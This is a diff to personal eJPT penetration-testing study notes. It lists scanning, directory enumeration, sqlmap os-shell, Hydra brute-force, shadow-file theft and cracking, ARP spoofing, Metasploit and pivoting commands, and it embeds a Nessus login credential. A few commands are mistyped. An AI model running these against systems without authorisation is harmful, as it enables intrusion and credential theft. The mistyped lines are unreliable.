@@ -1,4 +1,4 @@
-# eJPT Study Notes
+##eJPT##
 
 
 Information Gathering::
@@ -24,7 +24,7 @@ Scanning & Footprinting::
 	
 	ping sweep:
 		-nmap -sn x.x.x.x-y
-		-fping -a -g x.x.x.x-y  (2>/dev/null to send to stderr.)
+		-fping -a -g -m -A -q x.x.x.x-y  (2>/dev/null to send to stderr.)
 
 	OS Fingerprinting:
 		-nmap -Pn(to skip alive-test) -O(OS Scan) <target>
@@ -52,12 +52,17 @@ Scanning & Footprinting::
 			masscan -c <file>.conf
 
 Vulnerability Assessment:
-	
 	Engagement -> Information Gathering -> Footprinting & Scanning -> Vulnerability Assessment -> Reporting
 	No active exploitation, POC on paper
+
+	Nessus:
+		systemctl start nessusd / /etc/init.d/nessusd start
+		login:
+			user: v4rd1
+			pass: 2
+			
 	
 Web Attacks:
-	
 	netcat:
 		nc <Address> <port>
 		HEAD / HTTP/1.0
@@ -89,7 +94,7 @@ Web Attacks:
 			HOST: www.ex.com
 
 			<PUT DATA>
-			
+
 		DELETE - Delete a file from the server
 			DELETE path/to/destination HTTP/1.1
 			HOST: www.ex.com
@@ -98,12 +103,20 @@ Web Attacks:
 			OPTIONS / HTTP/1.1
 			HOST: www.ex.com
 
+	wget:
+		download a file - wget -O <output> <HTTP://FILE/LOCATION>
+
 	Dir/File Enumeration:
 		dirb:
 			default - dirb http://<site>/
 			wordlist - dirb http://<site>/ wordlist/path
 			user-agent - dirb http://<site>/ -a "<useragent>"
 			listen through port(burp etc.) - dirb http://<SITE IP>/ -p http://localhost:8080
+			with creds - dirb http://site/protected-folder -u user:pass
+
+		gobuster:
+			gobuster dir -u <URL> -w <wordlist> -U (*AUTH-USER) -P (*AUTH-PASS) -e(use full address)
+
 		mysql:
 			mysql -h <IP> --user='' --password=''
 	
@@ -195,6 +208,7 @@ Web Attacks:
 				--technique - UNION/BLIND/?
 				--data=<POST STRING>(BURP)
 				-v3 --fresh-queries - shows which payload was used by SQLMap
+				--os-shell - try to get shell
 				--users - which users are connected to the dbs
 				--dbs - which databases exist
 				Enumerate database:
@@ -243,8 +257,11 @@ System Attacks:
 				Push - adds an element to the stack
 				Pop - removes the last inserted element
 
+		Pointers:
+			A variable that holds a memory address. This address is the location of another object in memory.
+			
+
 Network Attacks:
-	
 	Hydra -L users.txt -P passwords.txt <service://server> <options>
 	Telnet:
 		hydra -L users.txt -P pass.txt telnet://target.server
@@ -256,6 +273,8 @@ Network Attacks:
 	SSH File Transfer:
 		ssh user@IP 'cat /etc/passwd' > ./passwd.txt
 		ssh user@IP 'cat /etc/shadow' > ./passwd.txt
+	SSH Login:
+		use auxiliary/scanner/ssh/ssh_login
 		To Crack:
 			unshadow passwd.txt shadow.txt > crackme
 			john crackme
@@ -308,7 +327,7 @@ Network Attacks:
 		Manipulate ARP Cache to recieve traffic destined to other IPs
 		Arpspoof:
 			Enable IP Forwarding - echo 1 > /proc/sys/net/ipv4/ip_forward
-			arpspoof -i <interface> -t <target> -r <host>
+			arpspoof -i <interface> -t <target> -r <lhost>
 			Intercept traffic on Wireshark
 
 	Metasploit:
@@ -332,3 +351,37 @@ Network Attacks:
 			migrate:
 				ps -U SYSTEM
 				migrate to svchost, winlogon etc.
+			
+			Brute SSH:
+				use auxiliary/scanner/ssh/ssh_login
+	
+	Pivotting:
+
+		meterpreter:
+			portfwd add -l <attacker port> -p <victim port> -r <victim ip>
+			portfwd add -l 3306 -p 3306 -r 192.168.222
+			run autorute -s <IP>
+
+		ssh <gateway> -R <remote port to bind>:<local host>:<local port>
+
+
+		Windows:
+			route ADD 192.168.35.0 MASK 255.255.255.0 192.168.0.2
+			plink(Reverse SSH):
+				/usr/share/windows-binaries/plink.exe
+				plink.exe -N -L 192.168.92.138:8000:192.168.92.128:8000 root@192.168.92.128
+				plink.exe -N -L 192.168.92.138:8000:192.168.92.128:22 root@192.168.92.128
+				On Target: plink.exe ip -P 22 -C -N -D 1080 -l KALIUSER -pw PASS
+
+			
+
+		Linux:
+			ip route show/list
+			route add default gw 192.168.1.254 eth0 (if route command present)
+			ip route add default gw 192.168.1.254 eth0 (if ip command present)
+			up route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.254 (?)
+
+		**ip route add <ROUTETO>/24 via <ROUTEFROM>(Gateway)**
+
+    File Search:
+	dir /s /b <filename>
